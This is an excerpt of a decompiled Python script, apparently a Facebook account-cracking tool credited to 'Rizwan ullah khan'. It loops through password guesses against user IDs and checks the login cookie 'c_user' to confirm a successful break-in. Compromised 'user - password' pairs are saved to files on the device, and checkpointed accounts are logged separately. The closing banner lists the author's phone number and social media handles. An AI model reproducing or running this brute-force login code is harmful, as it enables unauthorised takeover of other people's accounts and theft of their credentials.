# Decompile by : Rizwan ullah khan 
import os,sys
try: import requests
except ModuleNotFoundError:print("rizwan Install Module requests");os.system("python -m pip install requests &> /dev/rizwan")
try: import bs4
except ModuleNotFoundError:print("rizwan Install Module bs4");os.system("python -m pip install bs4 &> /dev/rizwan")
try: import mechanize
except ModuleNotFoundError:print("rizwan Install Module mechanize");os.system("python -m pip install mechanize &> /dev/rizwan")
try: import gTTS
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ rizwan 😘] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[rizwan-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/rizwan_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/rizwan_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[rizwan-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
...
\033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
\033[1;94m ⇨AUTHOR    : Rizwan ullah wazir
\033[1;95m ⇨WHATSAPP  : +923345478919
\033[1;96m ⇨FACEBOOK  : Rizwan Khan  (R.K.Mujnoon wazir)
\033[1;93m ⇨INSTA     : Rizwan Khan
